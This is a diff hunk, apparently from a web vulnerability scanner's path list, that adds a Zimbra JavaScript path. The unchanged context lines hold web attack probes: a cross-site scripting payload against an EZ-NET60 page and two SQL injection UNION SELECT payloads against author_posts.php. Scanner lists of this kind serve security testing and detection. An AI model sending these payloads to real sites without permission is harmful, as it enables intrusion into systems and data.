@@ -159,3 +159,4 @@
 /EZ-NET60/AlertMessages.aspx?Usertext=<img%20src%3Dx%20onerror%3Dalert(document.domain)>
 /author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1
 /cms/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1
+/js/zimbraMail/share/model/ZmSettings.js
